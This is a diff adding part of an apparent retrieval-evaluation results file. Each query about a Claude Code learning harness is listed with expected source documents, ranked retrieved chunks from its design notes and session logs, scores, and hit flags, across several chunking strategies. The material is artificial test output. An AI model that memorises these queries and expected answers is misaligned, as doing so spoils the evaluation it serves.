+            "source": "design/complete/session-digest-plan.md",
+            "section": "What goes in session-digest SKILL.md (not startwork)",
+            "text": "### What goes in session-digest SKILL.md (not startwork)\n\nThe session-digest SKILL.md documents its own sub-agent mode:\n\n**Sub-agent mode** (dispatched by startwork or another skill via Task\ntool prompt): skip Phase 1's interactive confirmation and Phase 4's\ninteractive approval. Run Phases 1-3 autonomously, return the structured\ndiff as output. The calling skill handles presentation and approval.\n\n**Standalone mode** (`/session-digest`): run all four phases\ninteractively.",
+            "charCount": 477
+          },
+          {
+            "rank": 2,
+            "score": 0.7359273170708657,
+            "source": "design/complete/improvement-plan.md",
+            "section": "Why this matters",
+            "text": "## Why this matters\n\nThe original plan's evidence sources were:\n1. Current conversation (always available)\n2. Git log and diffs (artifacts built)\n3. Session log files written by session-review itself (our summaries)\n\n**The gap:** Session log files are summaries session-review wrote.\nThey're good for deduplication (which concepts were already quizzed) but\nnot for discovering evidence from sessions not yet reviewed. The actual\nlearning evidence lives in raw Claude Code conversation JSONL files at\n`~/.claude/projects/<project-encoded>/<uuid>.jsonl`.\n\nSession-discovery finds those JSONL files. This gives session-review:\n- Evidence from ALL sessions since last review, not just the current one\n- Concrete `messageCount` numbers per session → objective context gate\n- `firstPrompt` per session → quick triage of what each session covered",
+            "charCount": 839
+          },
+          {
+            "rank": 3,
+            "score": 0.7348960312942854,
+            "source": "design/2026-03-05-learning-loop-analysis.md",
+            "section": "Session Discovery (Infrastructure Skill)",
+            "text": "### Session Discovery (Infrastructure Skill)\n\n**Trigger:** Dispatched by session-digest, session-review,\nprogress-review, or startwork. Not user-facing.\n\n**Runs:** `bun run <harness-root>/scripts/session-discovery.ts` with\n`--since`, `--until`, and optional `--project` flags.\n\n**Reads:** `~/.claude/projects/` directory (Claude Code's session JSONL\nfiles).\n\n**Returns:** JSON manifest containing:\n- `meta`: paths scanned, date range, session/error counts\n- `sessions[]`: sessionId, project, filePath, start/end timestamps,\n  messageCount, userMessageCount, firstPrompt, gitBranch\n\nConsumers use this manifest to decide whether to read JSONL inline or\ndelegate to sub-agents (a context management gate — small sessions read\ninline, large sessions get sub-agents).\n\n---",
+            "charCount": 768
+          }
+        ],
+        "hit": true,
+        "totalPayload": 2084
+      },
+      {
+        "id": "r7-domain-map",
+        "query": "Domain map schema breaking learning loop skills — migrating from flat YAML current-state to structured domain graph",
+        "context": "User planning migration from flat YAML learning state to a nested domain graph structure.",
+        "expectedSources": [
+          "design/",
+          "research/"
+        ],
+        "results": [
+          {
+            "rank": 1,
+            "score": 0.7857942662880562,
+            "source": "design/2026-03-07-domain-graph-integration-plan.md",
+            "section": "Graceful degradation during transition",
+            "text": "### Graceful degradation during transition\n\nEvery updated skill must handle three states:\n\n| State | Behavior |\n|-------|----------|\n| New format only (domain graph + learner state JSON) | Full capability — fringe, priority, practice mode, etc. |\n| Old format only (current-state.md, no domain graph) | Legacy behavior — flat score reads, text-based arc/goal parsing. Prompt for migration. |\n| Both formats present (mid-migration or backup) | Read new format. Ignore old files. |\n| Neither format (fresh install) | Prompt for intake. |\n\nThis means every skill update in Phases 4-7 has TWO read paths: one\nfor the new JSON format and one for the legacy YAML format. The legacy\npath is the current behavior, preserved as fallback. The new path adds\ndomain-graph-aware features (fringe, knowing profiles, interaction\nmatrix).\n\n**The legacy read path is not temporary.** Users who never run\ndomain-map still get a functional harness. The domain graph is an\nenhancement, not a gate. Skills that currently work without a domain\ngraph must continue to work without one.",
+            "charCount": 1062
+          },
+          {
+            "rank": 2,
+            "score": 0.7774659027984053,
+            "source": "design/2026-03-07-domain-graph-integration-plan.md",
+            "section": "What's broken",
+            "text": "## What's broken\n\nEvery skill in the learning loop reads/writes a single\n`learning/current-state.md` (YAML markdown) that conflates domain\ntopology and learner observations. The new schema splits this into two\nJSON files with different structures, different paths, and different\nfield names.\n\n**Old format example** (`learning/current-state.md`):\n\n```yaml\n  - name: react-hooks\n    arc: react-fundamentals\n    score: 4\n    source: audit:observed\n    last-quizzed: 2026-02-10\n    times-quizzed: 1\n    history:\n      - { date: 2026-02-10, score: 3, note: \"...\" }\n```\n\n**New format equivalent** (`learning/state/<slug>.state.json`):\n\n```json\n\"react-hooks\": {\n  \"score\": 4,\n  \"gap\": null,\n  \"fluencyTarget\": \"production\",\n  \"chunkingState\": \"consolidated\",\n  \"chunkingSelfReport\": \"fluency\",\n  \"lastAssessed\": \"2026-02-10\",\n  \"timesAssessed\": 1,\n  \"assessments\": [\n    { \"date\": \"2026-02-10\", \"score\": 3, \"source\": \"session-review:quiz\",\n      \"gap\": \"procedural\", \"instrument\": \"quiz\",\n      \"evidence\": \"correct closure model but couldn't write useEffect cleanup\",\n      \"note\": \"...\" }\n  ]\n}\n```\n\nOptional fields shown above: `chunkingSelfReport` (learner's own\nassessment — \"exposure\" / \"recognition\" / \"fluency\" / \"automaticity\"),\n`gap` and `evidence` on Assessment.",
+            "charCount": 1267
+          },
+          {
+            "rank": 3,
+            "score": 0.7774621936980189,
+            "source": "design/2026-03-07-domain-graph-integration-plan.md",
+            "section": "Context",
+            "text": "(per-learner)\n\nPath resolution: skills read `~/.config/weft/root` for harness root.\nLearner data paths resolve from CLAUDE.md path mappings.\n\n**What exists on the branch:**\n\n| Artifact | Status |\n|----------|--------|\n| `scripts/types/domain-graph.ts` | Complete (77 lines) |\n| `scripts/types/learner-state.ts` | Complete (57 lines) |\n| `scripts/lib/graph-queries.ts` | Complete (476 lines) — fringe, priority, practice mode, coverage, surmise |\n| `scripts/migrate-observations.ts` | Complete (509 lines) — legacy YAML to learner state JSON |\n| `.claude/references/domain-graph-schema.md` | Complete (286 lines) |\n| `.claude/skills/domain-map/SKILL.md` | Complete (394 lines) |\n| `.claude/skills/domain-map/subagents.md` | Complete (402 lines) |\n| `.claude/skills/domain-update/SKILL.md` | Complete (156 lines) |\n| `docs/schema-guide.md` | Complete (176 lines) |\n| `domains/.gitkeep` | Placeholder only — no domain graphs yet |\n\n**What the branch does NOT touch:** Any existing skill that reads or\nwrites learning state. Every skill on main still targets the old\n`learning/current-state.md` YAML format.\n\n---",
+            "charCount": 1108
+          }
+        ],
+        "hit": true,
+        "totalPayload": 3437
+      },
+      {
+        "id": "r8-domain-schema",
+        "query": "Implementing domain graph and learner state type definitions — compositional nesting, complexity ranges, growth edges",
+        "context": "User implementing TypeScript types for the domain graph schema.",
+        "expectedSources": [
+          "design/",
+          "research/",
+          "learning/goals.md"
+        ],
+        "results": [
+          {
+            "rank": 1,
+            "score": 0.7665837534020407,
+            "source": "design/2026-03-07-domain-graph-integration-plan.md",
+            "section": "Context",
+            "text": "## Context\n\nThe `hart/domain-graph-schema` branch introduces a two-file architecture\nfor learning state:\n\n- **Domain graph** (`domains/<slug>.domain.json`) — topology, shared,\n  learner-independent. Concepts, prerequisite edges, arcs, complexity\n  ranges, knowing profiles.\n- **Learner state** (`learning/state/<slug>.state.json`) — observations,\n  per-learner, per-domain. Scores, gaps, chunking state, assessment\n  history, bridges, goals.\n\nThey join on concept ID. The domain graph says \"concept X requires\nconcept Y at level 3.\" The learner state says \"this learner is at\nlevel 4 on Y and level 2 on X.\"\n\n**Concept identity:** Domain graphs key concepts by slug ID (e.g.,\n`react-hooks`, `async-execution-model`). The migration script generates\nslugs from legacy concept names via lowercasing and hyphenation. The\n`ConceptNode.name` field preserves the human-readable name. Skills\ndoing concept matching should check both the key (ID) and the `name`\nfield.\n\n**File locations:**\n\n- Harness code (skills, scripts, references): `<harness-root>/`\n  (weft repo)\n- Learner data (current-state, session logs, learner state JSON):\n  `<learner-root>/learning/` (per-learner repo, e.g. roger)\n- Domain graphs: `<harness-root>/domains/` (shared, shipped with\n  harness)\n- Learner state overlays: `<learner-root>/learning/state/`\n  (per-learner)\n\nPath resolution: skills read `~/.config/weft/root` for harness root.\nLearner data paths resolve from CLAUDE.md path mappings.\n\n**What exists on the branch:**",
+            "charCount": 1495
+          },
+          {
+            "rank": 2,
+            "score": 0.7574109591760886,
+            "source": "design/complete/prior-art-sources.md",
+            "section": "What they offer maestro",
+            "text": "scope (individual learner, single domain or few domains), which avoids\nthis scaling problem but also means there's less value in the\nindustrial-strength ontology infrastructure.\n\n**Data structure implication:** A labeled directed graph where nodes are\nconcepts and edges are typed relationships (requires, bridges-to,\nenables, is-part-of, adjacent-to). The graph should support multiple\ngranularity levels -- individual concepts nest within capability\nclusters, which nest within arcs or goals. Different skills read the\ngraph at different resolutions. The graph evolves over time as new\nconcepts and relationships are discovered.\n\n---",
+            "charCount": 635
+          },
+          {
+            "rank": 3,
+            "score": 0.7448695577966001,
+            "source": "research/learning-dag-representations.md",
+            "section": "What this buys for the learning-state DAG",
+            "text": "### What this buys for the learning-state DAG\n\n**Complexity range as a field, not computed.** Each concept stores\n[min_complexity, max_complexity] and current_score. Growth edge =\nthe gap between current_score and max_complexity. When current_score\nhits max_complexity, either:\n1. The concept is genuinely mastered at all levels\n2. The concept should decompose (the max was set too low)\n\nThis makes the score-5 problem a schema question, not a scoring\nquestion.\n\n**Competence function for pacing.** The square root competence function\nsuggests a learning velocity model: early progress is fast (conceptual\nbridges), later progress is slow (procedural chunking). This matches\nHart's observed pattern. The competence function could modulate how\naggressively the system proposes new material vs. consolidation reps.\n\n**Self-paced learning maps to the agency principle.** The learner\nchooses what to work on from the outer fringe. The system's role is\nto compute the fringe and present it — not to mandate the sequence.\nThis aligns with P2 (attention as sovereignty).",
+            "charCount": 1063
+          }
+        ],
+        "hit": true,
+        "totalPayload": 3193
+      },
+      {
+        "id": "r9-principles",
+        "query": "Design principles update — adding relationship as primary principle alongside awareness and attention",
+        "context": "User revising design principles to add relationship as a core principle.",
+        "expectedSources": [
+          "design/design-principles.md",
+          "design/teaching-principles.md",
+          "notepad/009"
+        ],
+        "results": [
+          {
+            "rank": 1,
+            "score": 0.788665153326586,
+            "source": "design/design-principles.md",
+            "section": "Primary layer",
+            "text": "## Primary layer\n\nPrinciples 1 and 2 are superordinate. Awareness is the ground; attention\nis its directed faculty. When awareness is intact but attention is\ncompromised, recovery is swift. The reverse is less true. All other\nprinciples serve this layer.",
+            "charCount": 254
+          },
+          {
+            "rank": 2,
+            "score": 0.7756813292141891,
+            "source": "design/harness-features.md",
+            "section": "P1. Awareness is the ground",
+            "text": "### P1. Awareness is the ground\n\nThe field within which all experience occurs. The system stewards what\nit cannot possess. See `design/design-principles.md` §1.\n\n**Existing implementations:**\n- Operating principle #1 (agency over efficiency — protects the human's\n  self-directed awareness)\n- Experiment-first loop (user tries, observes, then asks — preserves\n  the natural rhythm of awareness and attention)\n- Emotional reflection skill (mirrors awareness state without attempting\n  to fix it; knows its boundary)\n- Watch-for items in CLAUDE.md (authority shadow, confidence gap — patterns\n  that fragment awareness when activated)\n- Tutor posture: Socratic method preserves the learner's active\n  engagement rather than inducing the passivity that narrows awareness\n\n**Features to catch:**\n\n| Feature | Status | Notes |\n|---------|--------|-------|\n| Emotional reflection skill | Deferred | Behavior embedded in Tutor personality; standalone skill not built. Mirrors awareness state; knows its boundary with somatic/attachment work |\n| Watch-for pattern recognition | Built | CLAUDE.md flags patterns that fragment awareness |\n| Experiment-first loop protection | Built | Preserves natural rhythm of awareness and attention |\n| Awareness state recognition | Not started | Can the system infer coherence/fragmentation from interaction patterns? |\n| Session pacing / rhythm design | Not started | Transitions, breaks, flow-state protection |\n| Fragmentation alerts | Not started | System notices signs of awareness fragmentation and names it |\n| Practice integration hooks | Not started | Where do contemplative/somatic practices connect to session design? Also serves P8. |\n| Voice-to-text input (awareness side) | Not started | Speaking preserves broader somatic awareness than typing; reduces postural narrowing. (Primary home: P2 Attention.) |\n| Graceful degradation | Not started | When awareness is fragmented, shift to lower-demand modes rather than pushing through |\n\n---",
+            "charCount": 1979
+          },
+          {
+            "rank": 3,
+            "score": 0.7554022263970817,
+            "source": "design/design-principles.md",
+            "section": "Serving layer",
+            "text": "## Serving layer\n\nPrinciples 3–10 serve the primary layer. Each advances awareness and\nattention through a specific mechanism.",
+            "charCount": 126
+          }
+        ],
+        "hit": true,
+        "totalPayload": 2359
+      },
+      {
+        "id": "r10-extraction",
+        "query": "Building conversation extraction script for session transcripts — parsing tool use, error codes, and learning signals from JSONL logs",
+        "context": "User building a script to parse Claude Code conversation transcripts for learning signals.",
+        "expectedSources": [
+          "design/2026-03-09-metaclaude-local-prd.md",
+          "design/complete/improvement-plan.md"
+        ],
+        "results": [
+          {
+            "rank": 1,
+            "score": 0.728979058479689,
+            "source": "design/2026-03-09-metaclaude-local-prd.md",
+            "section": "Session logging (built)",
+            "text": "## Session logging (built)\n\nStructured per-session logs in `weft-dev/meta/`. Each file covers one\nClaude Code conversation. Format: JSONL with typed entries.\n\n**Storage:** `weft-dev/meta/<date>_<uuid-prefix>.jsonl`\n(e.g., `meta/2026-03-09_0beb743c.jsonl`)\n\n**Session identity:** Derived from transcript path UUID\n(`basename \"$TRANSCRIPT_PATH\" .jsonl`). Per-session pointer file at\n`~/.claude/metaclaude/sessions/{8-char-id}/session-log` coordinates\nbetween observer.sh (writes) and inject.sh (reads) so both append to\nthe same log. Each session's state (injection, accumulator, fingerprint,\npointer) is isolated in its own directory.\n\n**Entry types:**\n\n| Type | Written by | Content |\n|------|-----------|---------|\n| `session_header` | observer.sh (first turn) | session_id, hook_session_id, transcript_path, started_at, observation_mode, model, cwd, permission_mode |\n| `observation` | observer.sh (every turn) | turn number, context_window (transcript turns, user turns), pipeline (inference_1 with latency and metadata), decision (inject/silent), injection_content, full_response, user_message, accumulator_in, accumulator_out |\n| `observation_skipped` | observer.sh (fingerprint match) | turn number, reason (\"window_unchanged\"), fingerprint hash |\n| `injection` | inject.sh (when delivered) | timestamp, content, delivered:true, user_prompt, session_id, permission_mode |\n| `error` | observer.sh (on failure) | stage, error message, latency |\n\n**Current pipeline shape (no retrieval):**\n- `inference_1` (purpose: `assess_and_decide`, latency_ms, metadata with model/usage/stop_reason)",
+            "charCount": 1590
+          },
+          {
+            "rank": 2,
+            "score": 0.7214948091290733,
+            "source": "design/2026-03-05-learning-loop-analysis.md",
+            "section": "Session Discovery (Infrastructure Skill)",
+            "text": "### Session Discovery (Infrastructure Skill)\n\n**Trigger:** Dispatched by session-digest, session-review,\nprogress-review, or startwork. Not user-facing.\n\n**Runs:** `bun run <harness-root>/scripts/session-discovery.ts` with\n`--since`, `--until`, and optional `--project` flags.\n\n**Reads:** `~/.claude/projects/` directory (Claude Code's session JSONL\nfiles).\n\n**Returns:** JSON manifest containing:\n- `meta`: paths scanned, date range, session/error counts\n- `sessions[]`: sessionId, project, filePath, start/end timestamps,\n  messageCount, userMessageCount, firstPrompt, gitBranch\n\nConsumers use this manifest to decide whether to read JSONL inline or\ndelegate to sub-agents (a context management gate — small sessions read\ninline, large sessions get sub-agents).\n\n---",
+            "charCount": 768
+          },
+          {
+            "rank": 3,
+            "score": 0.7183914502399428,
+            "source": "design/complete/session-digest-plan.md",
+            "section": "`.claude/skills/session-digest/SKILL.md`",
+            "text": "intake. Ask user to confirm before proceeding (they may want to\n   narrow the window — especially relevant for large first-run windows).\n\n#### Phase 2: Extract\n\nContext management gate (same thresholds as session-review):\n\n| Manifest data | Strategy |\n|---|---|\n| 0-1 sessions AND total messageCount < 200 | Inline: read JSONL(s) directly |\n| 2-3 sessions OR total messageCount 200-500 | Single sub-agent with all JSONL paths |\n| 4+ sessions OR total messageCount > 500 | Parallel sub-agents — one per session JSONL |\n\nEach reader (inline or sub-agent) receives:\n- The JSONL file path\n- Current `learning/current-state.md` (so it knows existing concepts/scores)\n- Instructions to extract:\n\n```\nconcepts_encountered:\n  - concept: [name — match existing current-state names when possible]\n    evidence: [specific quote, paraphrase, or behavioral description]\n    signal_type: new_exposure | struggle | breakthrough | teaching | deepening\n    estimated_score: [0-5, or null if uncertain]\n    gap_type: [conceptual | procedural | recall, or null]\n    confidence: [high | moderate | low]\n\nprocedural_observations:\n  - [workflow patterns, tool usage, debugging approach — brief]\n```\n\nSub-agent filtering instructions (same noise patterns as session-review):\n- Filter to `user` and `assistant` message types only\n- Skip blocks starting with: `<ide_opened_file>`, `<system-reminder>`,\n  `<command-message>`, `<command-name>`, `<local-command`\n- Focus on: error debugging, user explanations, new concepts introduced,\n  code written/reviewed, design decisions articulated\n- Skip: pure orchestration (\"commit push merge\"), file listing, routine\n  tool calls\n\n#### Phase 3: Synthesize\n\nLoad current-state.md. Compare extracted concepts against current state.\nBuild a proposed diff with four sections:",
+            "charCount": 1788
+          }
+        ],
+        "hit": true,
+        "totalPayload": 4146
+      }
+    ]
+  },
+  {
+    "strategy": "fixed-2000",
+    "chunkCount": 657,
+    "sizeStats": {
+      "mean": 1888,
+      "median": 2000,
+      "p95": 2000,
+      "max": 2000,
+      "over800": 632,
+      "over2000": 0
+    },
+    "queries": [
+      {
+        "id": "h1-growth-edge",
+        "query": "React Context provider/consumer pattern — learner's current level and gap type",
+        "context": "User struggling with where to place React Context Provider — conceptual gap on provider/consumer pattern.",
+        "expectedSources": [
+          "learning/current-state.md",
+          "learning/arcs.md"
+        ],
+        "results": [
+          {
+            "rank": 1,
+            "score": 0.6991021079564139,
+            "source": "design/teacher-role/teacher-relationship.md",
+            "section": "chars 23800-25800",
+            "text": "wsable. The structured data the\n  harness produces is the matching signal.\n- **Role fluidity:** User A learns React from User B, who learns\n  system design from User C. No separate accounts. The harness\n  identity is the person, not the role.\n- **Feedback resolution model:** Shared source of truth for how\n  feedback works. Both parties reference it. The harness coaches\n  toward higher resolution.\n\n---\n\n## Roadmap — Post-MVP\n\nOrdered by the feature-ordering heuristic (breadth × compounding ×\nupstreamness × time-to-value):\n\n1. **Teacher-assisted intake** — Highest upstream value. A teacher\n   participating in intake produces a sharper initial model, which\n   compounds through every subsequent session.\n\n2. **Learner profile card** — Enables discovery. A portable, shareable\n   summary of who you are as a learner: goals, growth edges, project\n   interests, what kind of help you seek. Generated from harness state,\n   edited by the student. Serves all four match types.\n\n3. **Discovery board** — The matching layer. One mechanism, four match\n   types. Profiles include both what you offer and what you seek.\n   Start simple.\n\n4. **Agent as resolution coach** — Prompt teachers to raise feedback\n   resolution during composition. Never shift valence, only prompt for\n   precision. See `design/teaching-principles.md` §T1.\n\n5. **Celebrate wins** — Prompt student to post milestones publicly\n   after great sessions or progress reviews. GitHub, social media, etc.\n   Creates a rearview mirror of progress and encourages celebrating\n   growth.\n\n6. **Peer collaboration pathway** — Peers who discover shared growth\n   edges or project affinity can exchange lessons learned and spin up\n   group projects.\n\n7. **Teacher-published materials → lesson-scaffold** — Teacher\n   disseminates lesson plans through the relationship repo. Each\n   student's harness runs them through `/lesson-scaffold`, producing a\n   personalized scaffold based on the student's current-state. Same\n   lesson, different scaff",
+            "charCount": 2000
+          },
+          {
+            "rank": 2,
+            "score": 0.6826421421719095,
+            "source": "design/design-principles.md",
+            "section": "chars 10200-12200",
+            "text": "session patterns, and the\nlearner's own reflections — and to calibrate the challenge accordingly.\nThis means selecting the right project, the right scope within that\nproject, and the right pacing of novelty introduction. It also means\nrecognizing when the learner has slipped out of the zone and adjusting\nbefore the closure compounds.\n\n### 10. The system facilitates human teaching relationships\n\nEvery teacher is an obligate student. Every student has something to\nteach. The system does not replace these relationships — it makes them\nmore discoverable, more legible, and more fruitful.\n\nThe harness already produces structured state about where the learner\nis: goals, gaps, trajectory, session history. This state is the\nlearner's signal — a regularized description of what they need and\nwhere they're growing. When shared with consent, it becomes the basis\nfor a teacher to see the student clearly without requiring hours of\ndiagnostic conversation. It answers \"where are you?\" so the human\nrelationship can start at \"what should we do about it?\"\n\nTeachers benefit from the same harness. A teacher at their own growth\nedge — learning what they don't yet know how to teach, or deepening\nexpertise in their own domain — is a better teacher. The harness\nserves the teacher's learning exactly as it serves the student's. The\nrole distinction is not in the tool but in the relationship between\ntwo users: User A learns React from User B, who learns system design\nfrom User C.\n\nThis principle generates features at three scales:\n\n1. **Exchange** — A protocol for sharing developmental state between\n   student and teacher, with consent. The teacher sees the student's\n   progress reviews, goals, and gaps. The teacher responds with\n   guidance that the student's harness surfaces at session start.\n\n2. **Discovery** — A means for students and teachers to find each\n   other. Students publish what they need; teachers publish what they\n   offer. The structured data the harness already produces is the\n",
+            "charCount": 2000
+          },
+          {
+            "rank": 3,
+            "score": 0.6754855682080457,
+            "source": "design/platform-layer.md",
+            "section": "chars 8500-10500",
+            "text": "e matching signal.\nSee `teacher-relationship.md` §Relationship types and discovery for the\nfour match types.\n\n**Teacher-teacher relationships** are another relationship type not yet\nmapped. Teachers coordinating curriculum, sharing teaching strategies,\nco-teaching, or mentoring newer teachers.\n\n**Persistent source of truth and messaging platform** needed for\nnetworking. Could be Discord, could be a GitHub-native solution (e.g.,\nDiscussions on a community repo). Form factor deferred.\n\n---\n\n## Resolved decisions\n\n- **Course = GitHub repo.** Owned by teacher. Contains materials,\n  assignments, skills, personality, whatever the teacher designs.\n- **Enrollment = fork + watch.** Student forks the course repo, watches\n  origin for updates, pulls when updates arrive.\n- **Enrollment is a skill.** GitHub operations happen under the hood.\n  Non-technical students don't need to understand Git.\n- **Multiple courses = multiple forks.** Each course is an independent\n  repo on the student's machine.\n- **Grading is not an entity.** Developmental state tracking replaces\n  grading. Assessment is harness-native (before/after learning state).\n- **Text-based courses first.** The starting constraint for course\n  types. Non-text domains are a later challenge.\n- **Teachers and students can extend the design.** The protocol provides\n  primitives; participants design their own workflows on top.\n- **School is optional.** Teachers can operate independently.\n- **Cohorts are flexible.** No rigid entity scope — concurrent,\n  self-paced, per-course, multi-course all valid.\n\n## Open questions\n\n- **GitHub orgs for schools:** How do GitHub org permissions,\n  repo ownership, and visibility work? Research needed before designing\n  the school entity concretely.\n- **Cohort implementation:** Branch-per-cohort vs. repo-per-cohort.\n  Deferred.\n- **Cohort membership tracking:** JSON file in course repo? Markdown\n  roster? School database? Deferred.\n- **School database vs. structured files:** Does a school nee",
+            "charCount": 2000
+          }
+        ],
+        "hit": false,
+        "totalPayload": 6000
+      },
+      {
+        "id": "h2-wrong-boundary",
+        "query": "User placing operations on wrong side of client/server boundary — is this a known pattern?",
+        "context": "User put bcrypt hashing in a React component instead of the server. Known pattern: correct shape, wrong boundary.",
+        "expectedSources": [
+          "learning/current-state.md",
+          "learning/arcs.md"
+        ],
+        "results": [
+          {
+            "rank": 1,
+            "score": 0.643316463684495,
+            "source": "learning/session-logs/2026-02-12.md",
+            "section": "chars 3400-4859",
+            "text": " narrowing.** Authorization-as-WHERE-clause (4) and relational modeling (4) show strong structural reasoning. Session flow (3) and middleware ordering (3) show correct shapes with imprecise seams. The errors are consistently about *where* things happen and *what syntax* expresses them, not about what the system does.\n- **Relational modeling improved** from 3 → 4 across one session. The userId ownership pattern provided concrete reps on foreign keys in context.\n- **Auth mental model landed in one session.** From zero to a working middleware implementation + correct pipeline description. The remaining gaps are exposure-level (watching network requests, seeing Set-Cookie headers in devtools).\n\n## Key files\n- `chatbot/server.ts` — auth handler + middleware registration + route handlers with userId\n- `chatbot/middleware/requireAuth.ts` — Hart-authored auth middleware\n- `chatbot/db.ts` — shared Database instance\n- `chatbot/storage.ts` — SqlLiteStorage with userId ownership\n- `chatbot/src/lib/auth.ts` + `auth-client.ts` — Better-Auth server/client config\n- `chatbot/src/LoginForm.tsx` — sign-in/sign-up form\n- `chatbot/src/ChatDrawer.tsx` — drawer with auth-conditional content\n- `chatbot/express.d.ts` — Request type extension\n\n## Remaining work\n- Client-side routing (React Router) — deferred from routing-auth lesson\n- Error message display in LoginForm (Hart added TODO)\n- ChatWindow fade transition TODO\n- Update guides/routing-auth.md checklist",
+            "charCount": 1459
+          },
+          {
+            "rank": 2,
+            "score": 0.6327100461424806,
+            "source": "learning/session-logs/2026-02-10.md",
+            "section": "chars 8500-9905",
+            "text": "olving (loading role trick)\n- Identified SSRF vulnerability without being taught about it\n- Design direction during styling was highly specific — direct transfer from design background\n- Corrected Claude's bad session review (\"you're conflating my work with your own\")\n\n**Growth edges:**\n- Large body of Claude-authored code in project (link previews, turn-grouping, auto-scroll, Popover state, keyboard handling) that wasn't examined or questioned\n- Closure/render-state mental model not yet solid\n- CSS positioning model built through iteration rather than understanding (stacking contexts, sticky containment, backdrop-filter requirements)\n- CORS unknown — fundamental web security concept\n- No questions asked about unfamiliar React patterns during styling phase (contrast with morning session)\n\n## Key files created/modified\n- `chatbot/server.ts` — SDK integration, message history, /history, /reset, /preview endpoints\n- `chatbot/src/App.tsx` — state management, glassmorphic layout with absolute header/footer\n- `chatbot/src/ChatWindow.tsx` — turn-grouped messages, sticky user prompts, auto-scroll, custom link renderer\n- `chatbot/src/InputForm.tsx` — optimistic UI, Popover reset, Enter-to-send\n- `chatbot/src/LinkPreview.tsx` — hover preview with OG metadata (Claude-authored)\n- `chatbot/src/index.css` — dark mode theme, chat styles, markdown typography\n- `chatbot/index.html` — dark mode class",
+            "charCount": 1405
+          },
+          {
+            "rank": 3,
+            "score": 0.6251501929679547,
+            "source": "design/harness-features.md",
+            "section": "chars 1700-3700",
+            "text": " reflection skill | Deferred | Behavior embedded in Tutor personality; standalone skill not built. Mirrors awareness state; knows its boundary with somatic/attachment work |\n| Watch-for pattern recognition | Built | CLAUDE.md flags patterns that fragment awareness |\n| Experiment-first loop protection | Built | Preserves natural rhythm of awareness and attention |\n| Awareness state recognition | Not started | Can the system infer coherence/fragmentation from interaction patterns? |\n| Session pacing / rhythm design | Not started | Transitions, breaks, flow-state protection |\n| Fragmentation alerts | Not started | System notices signs of awareness fragmentation and names it |\n| Practice integration hooks | Not started | Where do contemplative/somatic practices connect to session design? Also serves P8. |\n| Voice-to-text input (awareness side) | Not started | Speaking preserves broader somatic awareness than typing; reduces postural narrowing. (Primary home: P2 Attention.) |\n| Graceful degradation | Not started | When awareness is fragmented, shift to lower-demand modes rather than pushing through |\n\n---\n\n### P2. Attention is the directed faculty\n\nSelective, compositional, exercised by both human and agent. The context\nwindow is the agent's attentional field. See `design/design-principles.md` §2.\n\n**Loading policy as design variable.** How content enters the agent's\nattention matters more than how it's transported. Three patterns, in\norder of attentional cost:\n\n1. **Always-on (ambient)** — injected into every session automatically.\n   Highest cost. Appropriate for CLAUDE.md core directives, user model.\n2. **Session-start-composed** — `/startwork` pulls relevant state and\n   composes the opening context. Medium cost. Appropriate for task state,\n   dependencies, team signals. Triage happens before loading.\n3. **On-demand (queryable)** — agent accesses content when needed (corpus\n   miner, reference files, tiered memory). Lowest ambient cost.\n\nThe gated-propagation princip",
+            "charCount": 2000
+          }
+        ],
+        "hit": false,
+        "totalPayload": 4864
+      },
+      {
+        "id": "h3-user-agency",
+        "query": "Builder Claude acting autonomously without user direction — which design principles govern user agency?",
+        "context": "Builder Claude made 6 tool calls without user direction — refactoring, adding error handling, restructuring. User didn't ask for this.",
+        "expectedSources": [
+          "design/design-principles.md",
+          "notepad/009-metaclaude-conscience.md"
+        ],
+        "results": [
+          {
+            "rank": 1,
+            "score": 0.6996215697665312,
+            "source": "notepad/009-metaclaude-conscience.md",
+            "section": "chars 0-2000",
+            "text": "# MetaClaude's Conscience: Design Principles as Alignment\n\n## The idea\n\nGive MetaClaude the design principles — not as rules to enforce,\nbut as a perceptual frame. MetaClaude doesn't just observe whether\nBuilder Claude is on-task. It observes whether the session is\nserving awareness, attention, and relationship.\n\n## What changes\n\nWithout the principles, MetaClaude is a project manager: \"you\ndrifted from the goal,\" \"you're circling,\" \"use the notepad.\"\nUseful but shallow.\n\nWith the principles, MetaClaude becomes something closer to what\nthe principles describe the system as: a steward of the human's\nawareness that compounds attention and serves relationship.\n\nConcrete difference in observations:\n\n**Without principles:**\n\"Builder Claude has been implementing for 20 minutes without\nchecking whether the user understands the code.\"\n\n**With principles:**\n\"The last three turns produced Claude-authored code the user\nhasn't engaged with. P1: the user's time is being spent but\nawareness may not be tracking. The code entered the project\nwithout the learning.\"\n\nThe second observation connects to something in the CLAUDE.md\nprofile: \"Claude-authored code as unexamined dependency.\" The\nprinciples give MetaClaude the frame to recognize this pattern\nas a first-class concern, not just a productivity note.\n\n## Which principles matter most for MetaClaude\n\nNot all 10 are equally relevant to a metacognitive observer.\nThe ones that do real work:\n\n**P1 (Awareness is the ground)** — MetaClaude's primary lens.\nIs the session serving the human's awareness or fragmenting it?\nIs difficulty well-aimed? Is time being spent where it compounds?\n\n**P2 (Attention is the directed faculty)** — Is Builder Claude's\ncontext well-composed? Is the user's attention on the right\nthing? Has the session drifted in altitude?\n\n**P5 (Intervention matches the gap)** — Is Builder Claude\nexplaining when it should be giving reps? Demonstrating when it\nshould be questioning? This is directly observable from the\ntranscr",
+            "charCount": 2000
+          },
+          {
+            "rank": 2,
+            "score": 0.6944062944153281,
+            "source": "design/harness-features.md",
+            "section": "chars 15300-17300",
+            "text": "ignal loss from premature cleanup. |\n\n---\n\n### P7. Human authority is non-negotiable\n\nThe human drives. The system proposes, the human disposes. See\n`design/design-principles.md` §7.\n\n**Existing implementations:**\n- Operating principle #1 (agency over efficiency)\n- Memory security rules (all writes require human approval)\n- Experiment-first loop (user tries, observes, then asks)\n- Tutor posture (Socratic — help the user do the cognitive heavy lifting)\n\n**Features to catch:**\n\n| Feature | Status | Notes |\n|---------|--------|-------|\n| Memory write approval gate | Built | Security rule in CLAUDE.md |\n| Trusted/untrusted content separation | Built | Memory files never contain raw external content |\n| Learner-initiated interactions | Built | Protect the experiment-first loop |\n| Autonomy metrics | Not started | Is the learner asking fewer questions over time? More precise ones? |\n| Graceful degradation | Not started | What happens when the system is unavailable? Learner should still function |\n| Override / correction mechanisms | Partial | Learner can correct current-state scores, update user model |\n\n---\n\n### P8. Play is the explore state\n\nWide, iterative attention with low cost of failure. The system creates\nconditions where play is available and attractive. See\n`design/design-principles.md` §8.\n\n**Existing implementations:**\n- Playful elements in some skill prompts (exaptation skill uses\n  cross-domain exploration)\n- 